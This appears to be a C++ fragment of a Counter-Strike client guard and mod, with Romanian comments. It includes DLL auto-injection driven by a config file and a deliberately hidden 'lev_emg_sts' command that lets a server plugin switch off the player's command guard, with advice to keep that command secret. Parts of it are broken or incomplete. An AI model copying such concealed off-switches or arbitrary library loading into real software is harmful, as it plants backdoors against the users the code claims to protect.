UNI
/*
https://hackerone.com/kohtep2010?type=user

https://www.youtube.com/watch?v=DUsj7PUq5fo
https://hernan.de/blog/lock-and-load-exploiting-counter-strike-via-bsp-map-files/
*/


/*
int main(int argc, char* argv[])	int main(int argc, char* argv)	int main(int argc, char** argv)
*/

// def - https://github.com/xvids/ExtraMirror/blob/master/MiniBase/enginemsg.cpp#L90
bool IsCommandGood(const char *str) {
	if (dezactivare_guard) return true;//x
	char *ret = g_Engine.COM_ParseFile((char *)str, com_token);
	if (ret == NULL || com_token[0] == 0)	return true;
	if ((ParseList(com_token)))	return false;
	return true;
}

bool IsCommandGood2(const char *str) {
	if (dezactivare_guard) return true;
	char *ret = g_Engine.COM_ParseFile((char *)str, com_token);
	if (ret == NULL || com_token[0] == 0)	return true;
	if ((ParseList2(com_token)))	return false;
	return true;
}



bool dezactivare_guard = false;

// def - https://github.com/xvids/ExtraMirror/blob/5a9ae09bb76061b661356487c019d1c334401cb4/MiniBase/client.cpp#L135
// RECOMANDARE - comenzile unice guard, să le schimbi numele/formatul! gen 'credits/comanda de dezactivare amxx/etc..' să nu fie publice
void InitHack(){
	static TCHAR sKeyNames[4096 * 3];
	GetPrivateProfileSection(TEXT("Commands"), sKeyNames, ARRAYSIZE(sKeyNames), g_settingsFileName);
	char *psKeyName = sKeyNames;
	g_blockedCmdCount = 0;
	while (psKeyName[0] != '\0') {
		g_blockedCmds[g_blockedCmdCount++] = strdup(psKeyName);
		psKeyName += strlen(psKeyName) + 1;
	}

	GetPrivateProfileSection(TEXT("ADetect"), sKeyNames, ARRAYSIZE(sKeyNames), g_settingsFileName);
	psKeyName = sKeyNames;
	g_anticheckfiles = 0;
	while (psKeyName[0] != '\0') {
		g_anticheckfiles2[g_anticheckfiles++] = strdup(psKeyName);
		psKeyName += strlen(psKeyName) + 1;
	}

	GetPrivateProfileSection(TEXT("Send Commands"), sKeyNames, ARRAYSIZE(sKeyNames), g_settingsFileName);
	psKeyName = sKeyNames;
	g_serverCmdCount = 0;
	while (psKeyName[0] != '\0') {
		g_serverCmds[g_serverCmdCount++] = strdup(psKeyName);
		psKeyName += strlen(psKeyName) + 1;
	}


	GetPrivateProfileSection(TEXT("AutoInject"), sKeyNames, ARRAYSIZE(sKeyNames), g_settingsFileName);
	psKeyName = sKeyNames;
	while (psKeyName[0] != '\0') {
		LoadLibraryA(psKeyName);
		psKeyName += strlen(psKeyName) + 1;
	}	
	GetPrivateProfileSection(TEXT("Cvars"), sKeyNames, ARRAYSIZE(sKeyNames), g_settingsFileName);
	char *psKeyName2 = sKeyNames;
	while (psKeyName2[0] != '\0')
	{
		AddOrModCvar(psKeyName2);
		psKeyName2 += strlen(psKeyName2) + 1;
	}
	g_pEngine->pfnAddCommand("set_ticket", Set_Ticket);
	if (g_Engine.Con_IsVisible() == 0)	g_Engine.pfnClientCmd("toggleconsole");
	ConsolePrintColor(0, 255, 11, "-- Extra Mirror v2.7X\n", BuildInfo.Build);
	ConsolePrintColor(255, 255, 255, "-- Use 'credits' for more information\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to Realwar for title\n");    
	ConsolePrintColor(255, 255, 255, "-- Thank's to FightMagister for functions\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to Spawner { Kiass }\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to magister\n");
	g_pEngine->pfnAddCommand("credits", Credits);
	g_pEngine->pfnAddCommand("inject", Inject);
	g_pEngine->pfnAddCommand("modelsn", models);
	g_pEngine->pfnAddCommand("update", Reload);
	g_pEngine->pfnAddCommand("lev_emg_sts", GSTS); //comanda ta secretă executată de AMXX pt status guard "lev_emg_sts 1=guard off/2=guard on"
	TCHAR value[16];
	GetPrivateProfileString(TEXT("Settings"), TEXT("steamid"), TEXT("0"), value, ARRAYSIZE(value), g_settingsFileName);
	steamid_r = g_pEngine->pfnRegisterVariable("steamid", strdup(value), 0);memset(value, 0, sizeof(value));
	GetPrivateProfileString(TEXT("Settings"), TEXT("cust_hud"), TEXT("0"), value, ARRAYSIZE(value), g_settingsFileName);
	ex_thud = g_pEngine->pfnRegisterVariable("cust_hud", value, 0);memset(value, 0, sizeof(value));
	GetPrivateProfileString(TEXT("Settings"), TEXT("logs"), TEXT("0"), value, ARRAYSIZE(value), g_settingsFileName);
	logsfiles = g_pEngine->pfnRegisterVariable("logs", value, 0);memset(value, 0, sizeof(value));
	GetPrivateProfileString(TEXT("Settings"), TEXT("events_block"), TEXT("0"), value, ARRAYSIZE(value), g_settingsFileName);
	events_block = g_pEngine->pfnRegisterVariable("events_block", value, 0); memset(value, 0, sizeof(value));
	GetPrivateProfileString(TEXT("Settings"), TEXT("motd_block"), TEXT("0"), value, ARRAYSIZE(value), g_settingsFileName);
	motd_block = g_pEngine->pfnRegisterVariable("motd_block", value, 0); memset(value, 0, sizeof(value));
	g_pEngine->pfnAddCommand("dump_cmd", DumpCmd);
}

void GSTS(){
	dezactivare_guard = strcmp(g_Engine.Cmd_Argv(1),"1") == 0; //? true : false;
}

//orig - https://github.com/xvids/ExtraMirror/blob/5a9ae09bb76061b661356487c019d1c334401cb4/MiniBase/client.cpp#L57
void Credits(){
	ConsolePrintColor(255, 255, 255, "-- Thank's to");	ConsolePrintColor(0, 255, 0, " [2010] Team\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to");	ConsolePrintColor(0, 255, 0, " madotsuki-team < *\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to ");	ConsolePrintColor(0, 255, 0, "or_75\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to ");	ConsolePrintColor(0, 255, 0, "Juice\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to ");	ConsolePrintColor(0, 255, 0, "Admrfsh\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to ");	ConsolePrintColor(0, 255, 0, "Garey\n");
	ConsolePrintColor(255, 255, 255, "-- Thank's to ");	ConsolePrintColor(0, 255, 0, "magister\n");
}




// total - https://github.com/FWGS/xash3d/blob/725fd84b5ba8d405979d63df7a906feb1bc87d51/engine/common/network.c#L1506
/*
void NET_GetLocalAddress( void )
{
	char		buff[512];
	struct sockaddr_in	address;
	socklen_t		namelen;

	Q_memset( &net_local, 0, sizeof( netadr_t ));

	if( noip )
	{
		MsgDev( D_INFO, "TCP/IP Disabled.\n" );
	}
	else
	{
		// If we have changed the ip var from the command line, use that instead.
		if( Q_strcmp( net_ip->string, "localhost" ))
		{
			Q_strcpy( buff, net_ip->string );
		}
		else
		{
			pGetHostName( buff, 512 );
		}

		// ensure that it doesn't overrun the buffer
		buff[511] = 0;

		NET_StringToAdr( buff, &net_local );
		namelen = sizeof( address );

		if( pGetSockName( ip_sockets[NS_SERVER], (struct sockaddr *)&address, &namelen ) != 0 )
		{
			MsgDev( D_ERROR, "Could not get TCP/IP address, TCP/IP disabled\nReason: %s\n", NET_ErrorString( ));
			noip = true;
		}
		else
		{
			net_local.port = address.sin_port;
			Msg( "Server IP address: %s\n", NET_AdrToString( net_local ));
		}
	}
}

struct net_status_s {
	int connected;
	netadr_t local_address;
	netadr_t remote_address;
	int packet_loss;
	double latency;
	double connection_time;
	double rate;
};
net_status_s status;

Eninge.NetApi->Status(&status);

char addr[256];
addr = Engine.NetApi->AdrToString(&status.local_address);

if (!strcmp(addr, "ip"))	dezactivare_guard = true;
*/
